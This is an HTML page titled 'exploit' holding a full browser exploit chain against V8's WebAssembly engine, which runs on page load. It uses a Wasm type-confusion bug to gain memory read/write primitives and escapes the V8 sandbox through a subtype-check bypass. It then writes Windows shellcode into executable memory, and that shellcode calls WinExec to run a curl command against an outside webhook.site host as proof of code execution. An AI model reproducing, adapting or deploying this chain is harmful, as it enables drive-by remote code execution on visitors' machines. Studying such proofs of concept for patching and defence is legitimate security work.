<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>exploit</title>
</head>

<body>
  <textarea id="log" rows="30" cols="120"
    style="font-family: Consolas,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace;"></textarea>
  <script src="wasm.js"></script>
<script>
    async function exp() {
      function hookLog() {
        const logTextarea = window.log;
        const ConsoleLog = console.log;
        console.realLog = ConsoleLog;
        console.log = (...args) => {
          logTextarea.value += args.join(' ') + '\n';
          ConsoleLog.apply(console, args);
        };
      }

      hookLog();

      function func(obj) {
        return obj;
      }

      // builder 0: export []->[ref 1]
      let builder_0 = new WasmModuleBuilder();
      let $s0_0 = builder_0.addStruct([makeField(kWasmI32, true)]);
      let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
      let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
      let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
      let $t_0 = builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');

      let instance_0 = builder_0.instantiate({import: {func}});
      let {table} = instance_0.exports;

      // builder 1: import []->[ref 2], wrapper miscompilation into []->[ref 1]
      let builder_1 = new WasmModuleBuilder();
      let $s0_1 = builder_1.addStruct([makeField(kWasmI32, true)]);
      let $s1_1 = builder_1.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);      // src type
      let $s2_1 = builder_1.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);  // tgt type, equiv. $s1_0
      let $sig_s2_ar_1 = builder_1.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));                 // equiv. $sig_s1_ar_0
      let $sig_v_v_1 = builder_1.addType(kSig_v_v);
      let $sig_i_r_1 = builder_1.addType(kSig_i_r);
      let $sig_i_i_1 = builder_1.addType(kSig_i_i);
      let $sig_v_ii_1 = builder_1.addType(kSig_v_ii);
      let $t_1 = builder_1.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));

      // loop until we detect type incompatibility due to tierup
      builder_1.addFunction('tierup', $sig_v_v_1).addLocals(wasmRefType($s2_1), 1).addBody([
        // local.set 0 w/ ref $s2_1
        ...wasmI32Const(0),
        kGCPrefix, kExprStructNewDefault, $s0_1,
        kGCPrefix, kExprStructNew, $s2_1,
        kExprLocalSet, 0,

        kExprLoop, kWasmVoid,
          // call table[0][0]
          kExprLocalGet, 0,
          ...wasmI32Const(0),
          kExprCallIndirect, $sig_s2_ar_1, $t_1,
          kExprDrop,
          kExprBr, 0,
        kExprEnd,
      ]).exportFunc();

      builder_1.addFunction('addrof', $sig_i_r_1).addBody([
        kExprLocalGet, 0,
        ...wasmI32Const(0),
        kGCPrefix, kExprStructNew, $s1_1,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kGCPrefix, kExprStructGet, $s2_1, 0,
      ]).exportFunc();

      builder_1.addFunction('caged_read', $sig_i_i_1).addBody([
        kExprRefNull, kNullExternRefCode,
        kExprLocalGet, 0,
        ...wasmI32Const(7),
        kExprI32Sub,
        kGCPrefix, kExprStructNew, $s1_1,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kGCPrefix, kExprStructGet, $s2_1, 1,
        kGCPrefix, kExprStructGet, $s0_1, 0,
      ]).exportFunc();

      builder_1.addFunction('caged_write', $sig_v_ii_1).addBody([
        kExprRefNull, kNullExternRefCode,
        kExprLocalGet, 0,
        ...wasmI32Const(7),
        kExprI32Sub,
        kGCPrefix, kExprStructNew, $s1_1,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kGCPrefix, kExprStructGet, $s2_1, 1,
        kExprLocalGet, 1,
        kGCPrefix, kExprStructSet, $s0_1, 0,
      ]).exportFunc();

      let instance_1 = builder_1.instantiate({import: {table}});
      let {tierup, addrof, caged_read, caged_write} = instance_1.exports;

      try {
        tierup();
      } catch {}

      // now follows v8sbx escape, using b/350292240 (rtt subtype check bypass, copy-pasted from b/351327767 & b/360533914 & b/368241697)
      {
        let builder = new WasmModuleBuilder();
        let $struct = builder.addStruct([makeField(kWasmI64, true)]);
        let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
        let $sig_l_s = builder.addType(makeSig([wasmRefType($struct)], [kWasmI64]));
        let $sig_l_ll = builder.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64]), kNoSuperType, false);
        let $sig_v_v = builder.addType(kSig_v_v);
        let $sig_lX_v = builder.addType(makeSig([], Array(32).fill(kWasmI64)), kNoSuperType, false);
        let $sig_v_i = builder.addType(kSig_v_i);
        let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
        let $sig_r_v = builder.addType(kSig_r_v);
        let $g = builder.addGlobal(kWasmI64, true);
        let $writer = builder.addFunction("writer", $sig_v_ls)
          .exportFunc()
          .addBody([
            kExprLocalGet, 1,
            kExprLocalGet, 0,
            kGCPrefix, kExprStructSet, $struct, 0,
          ]);
        let $reader = builder.addFunction("reader", $sig_l_s)
          .exportFunc()
          .addBody([
            kExprLocalGet, 0,
            kGCPrefix, kExprStructGet, $struct, 0,
          ]);
        let $boom = builder.addFunction("boom", $sig_l_ll)
          .exportFunc()
          .addBody([
            kExprLocalGet, 1,
            kExprLocalGet, 0,
            kExprI32Const, 0,
            kExprCallIndirect, $sig_l_ll, 0,
          ]);
        let $nop = builder.addFunction("nop", $sig_v_v)
          .exportFunc()
          .addBody([
          ]);
        let $rec = builder.addFunction("rec", $sig_v_i)
          .exportFunc();
        $rec.addBody([
          kExprBlock, kWasmVoid,
          kExprLocalGet, 0,
          kExprI32Const, 1,
          kExprI32Sub,
          kExprLocalTee, 0,
          kExprI32Eqz,
          kExprBrIf, 0,
          kExprLocalGet, 0,
          kExprCallFunction, $rec.index,
          ...Array(0x100).fill(0).flatMap(
            (_, idx) => [
              ...wasmI64Const(0x123456789abcdef0n + BigInt(idx)), kExprGlobalSet, $g.index
            ]
          ),
          kExprEnd,
        ]);
        let $leak = builder.addFunction("leak", $sig_lX_v)
          .exportFunc()
          .addBody([
            kExprI32Const, 0,
            kExprCallIndirect, $sig_lX_v, 0,
          ]);
        let $leak_wrap = builder.addFunction("leak_rec", $sig_lX_v)
          .exportFunc()
          .addBody([
            kExprI32Const, 0x30,
            kExprCallFunction, $rec.index,
            kExprCallFunction, $leak.index,
          ])
        let $get_writer = builder.addFunction("get_writer", kSig_r_v)
          .exportFunc()
          .addBody([
            kExprRefFunc, $writer.index,
            kGCPrefix, kExprStructNew, $box,
            kGCPrefix, kExprExternConvertAny,
          ]);
        let $get_reader = builder.addFunction("get_reader", kSig_r_v)
          .exportFunc()
          .addBody([
            kExprRefFunc, $reader.index,
            kGCPrefix, kExprStructNew, $box,
            kGCPrefix, kExprExternConvertAny,
          ]);
        let $get_boom = builder.addFunction("get_boom", kSig_r_v)
          .exportFunc()
          .addBody([
            kExprRefFunc, $boom.index,
            kGCPrefix, kExprStructNew, $box,
            kGCPrefix, kExprExternConvertAny,
          ]);
        let $get_nop = builder.addFunction("get_nop", kSig_r_v)
          .exportFunc()
          .addBody([
            kExprRefFunc, $nop.index,
            kGCPrefix, kExprStructNew, $box,
            kGCPrefix, kExprExternConvertAny,
          ]);
        let $get_leak = builder.addFunction("get_leak", kSig_r_v)
          .exportFunc()
          .addBody([
            kExprRefFunc, $leak.index,
            kGCPrefix, kExprStructNew, $box,
            kGCPrefix, kExprExternConvertAny,
          ]);
        let $table =
          builder.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, $writer.index]).exportAs("table");

        let instance = builder.instantiate();
        let { writer, reader, boom, nop, rec, leak, leak_rec, get_reader, get_writer, get_boom, get_nop, get_leak, table } = instance.exports;

        // Prepare corruption utilities.
        const kHeapObjectTag = 1;
        const kStructField0Offset = 8;
        const kMapOffset = 0;
        const kFuncRefMapTypeInfoOffset = 0x14;
        const kTypeInfoSupertypesOffset = 0x14;
        const MASK64 = (1n << 64n) - 1n;
        function getPtr(obj) {
          return addrof(obj);
        }
        function getField(obj, offset) {
          return caged_read(obj + offset - kHeapObjectTag);
        }
        function setField(obj, offset, value) {
          caged_write(obj + offset - kHeapObjectTag, value);
        }

        // box: WASM_STRUCT_TYPE
        function set_supertype(sub_box, sup_box) {
          let funcref_sub = getField(getPtr(sub_box), kStructField0Offset); // WASM_FUNC_REF_TYPE
          let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
          let typeinfo_sub = getField(map_sub, kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE

          let funcref_sup = getField(getPtr(sup_box), kStructField0Offset);
          let map_sup = getField(funcref_sup, kMapOffset);

          // typeinfo_sub.supertypes[0] = map_sup
          setField(typeinfo_sub, kTypeInfoSupertypesOffset, map_sup);
        }

        set_supertype(get_writer(), get_boom());
        set_supertype(get_reader(), get_boom());
        set_supertype(get_nop(), get_leak());

        table.set(0, nop);
        leak_rec();   // trigger initial liftoff compilation
        let leaks = leak_rec();

        function read(ptr) {
          table.set(0, reader);
          return boom(ptr - 0x7n, ptr - 0x7n) & MASK64;
        }
        function write(ptr, val) {
          table.set(0, writer);
          return boom(ptr - 0x7n, val);
        }

        let exp_rwx = leaks[6];
        let exp_rwx_end;

        // 48 8b e5 5d c3 : mov rsp, rbp ; pop rbp ; ret
        for (exp_rwx_end = exp_rwx; (read(exp_rwx_end) & 0xffffffffffn) != 0xc35de58b48n; exp_rwx_end += 1n);

        console.log(`[+] exp_rwx:     ${exp_rwx.toString(16)}`);
        console.log(`[+] exp_rwx_end: ${exp_rwx_end.toString(16)}`);

        const sc = [0x48, 0x83, 0xe4, 0xf0, 0x55, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x2e, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x15, 0xd7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0xe8, 0x34, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0xc9, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x20, 0xc3, 0x53, 0x57, 0x56, 0x41, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x54, 0x24, 0x30, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xcb, 0x8b, 0x9b, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xcb, 0x44, 0x8b, 0x43, 0x18, 0x8b, 0x7b, 0x20, 0x48, 0x01, 0xcf, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xc0, 0x4c, 0x39, 0xc6, 0x73, 0x43, 0x8b, 0x0c, 0xb7, 0x48, 0x03, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x33, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0xff, 0xc6, 0xeb, 0xd4, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x8b, 0x7b, 0x24, 0x48, 0x01, 0xcf, 0x48, 0x0f, 0xb7, 0x34, 0x77, 0x8b, 0x7b, 0x1c, 0x48, 0x01, 0xcf, 0x8b, 0x04, 0xb7, 0x48, 0x01, 0xc8, 0x41, 0x58, 0x5e, 0x5f, 0x5b, 0xc3, 0x53, 0x8a, 0x01, 0x8a, 0x1a, 0x84, 0xc0, 0x74, 0x0c, 0x38, 0xd8, 0x75, 0x08, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc2, 0xeb, 0xec, 0x28, 0xd8, 0x48, 0x0f, 0xbe, 0xc0, 0x5b, 0xc3, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00];
        const cmd = 'curl https://7542355f-ddc6-4194-92bf-449518a9f9d2.webhook.site/rce';
        for (let i = 0; i < cmd.length; i++) {
          sc.push(cmd.charCodeAt(i));
        }
        do {
          sc.push(0x00);
        } while (sc.length % 8 != 0);

        const sc_i64 = new BigInt64Array(new Uint8Array(sc).buffer);
        for (let i = 0; i < sc_i64.length; i++) {
          write(exp_rwx + BigInt(i) * 8n, sc_i64[i]);
        }

        // trigger shellcode
        rec(2);
        console.log(`[+] shellcode triggered!`);
      }
    }
    window.onload = exp;
  </script>
</body>
